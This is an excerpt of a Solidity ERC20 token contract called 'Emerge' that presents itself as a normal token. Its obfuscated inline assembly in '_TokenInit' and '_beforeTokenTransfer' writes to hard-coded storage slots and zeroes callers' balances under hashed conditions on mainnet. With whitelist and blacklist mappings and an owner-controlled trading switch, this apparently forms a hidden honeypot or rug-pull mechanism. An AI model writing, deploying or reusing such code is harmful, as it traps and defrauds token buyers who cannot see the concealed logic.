...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addEmerge;
    uint256 private _mergeVerge = block.number*2;

    mapping (address => bool) private _goodBoy; 
    mapping (address => bool) private _badBoy;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private fatTony;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private waterContent;
    address public pair;
    ...
    bool private trading; uint256 private whiteSun = 1; bool private exPlosion;
    uint256 private _decimals; uint256 private monsterDrink;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addEmerge.push(_router); addEmerge.push(msgSender_); addEmerge.push(pair);
        for (uint256 q=0; q < 3;) {_goodBoy[addEmerge[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x465d20789cc2c954c82c59089b947583c9c365a7892767f2583b0c89fe2e8092
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xb934d591421a7e3e33864f4e40da9d74e2e8469f62a6c5ac145e341351c92adc,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _mergeVerge = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addEmerge[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract Emerge is ERC20Token {
    constructor() ERC20Token("Emerge", "EMERGE", msg.sender, 58750 * 10 ** 18) {
    }
}